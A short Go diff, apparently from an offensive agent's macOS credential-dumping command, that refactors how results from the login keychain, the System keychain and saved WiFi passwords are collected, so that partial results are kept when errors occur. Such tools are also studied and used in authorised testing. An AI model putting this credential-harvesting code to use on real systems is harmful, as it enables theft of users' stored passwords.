@@ -60,25 +60,22 @@ func credmanDarwinList(args credmanArgs, showSecrets bool) structs.CommandResult
 	var allCreds []darwinCredEntry
 	var sections []string
 
-	loginCreds, loginErr := enumerateKeychain("", showSecrets)
-	if loginErr != "" {
-		sections = append(sections, fmt.Sprintf("[Login Keychain] %s", loginErr))
-	} else {
-		allCreds = append(allCreds, loginCreds...)
+	loginCreds, loginNote := enumerateKeychain("", showSecrets)
+	allCreds = append(allCreds, loginCreds...)
+	if loginNote != "" {
+		sections = append(sections, fmt.Sprintf("[Login Keychain] %s", loginNote))
 	}
 
-	sysCreds, sysErr := enumerateKeychain("/Library/Keychains/System.keychain", showSecrets)
-	if sysErr != "" {
-		sections = append(sections, fmt.Sprintf("[System Keychain] %s", sysErr))
-	} else {
-		allCreds = append(allCreds, sysCreds...)
+	sysCreds, sysNote := enumerateKeychain("/Library/Keychains/System.keychain", showSecrets)
+	allCreds = append(allCreds, sysCreds...)
+	if sysNote != "" {
+		sections = append(sections, fmt.Sprintf("[System Keychain] %s", sysNote))
 	}
 
-	wifiCreds, wifiErr := enumerateWiFiPasswords(showSecrets)
-	if wifiErr != "" {
-		sections = append(sections, fmt.Sprintf("[WiFi] %s", wifiErr))
-	} else {
-		allCreds = append(allCreds, wifiCreds...)
+	wifiCreds, wifiNote := enumerateWiFiPasswords(showSecrets)
+	allCreds = append(allCreds, wifiCreds...)
+	if wifiNote != "" {
+		sections = append(sections, fmt.Sprintf("[WiFi] %s", wifiNote))
 	}
 
 	if args.Filter != "" {
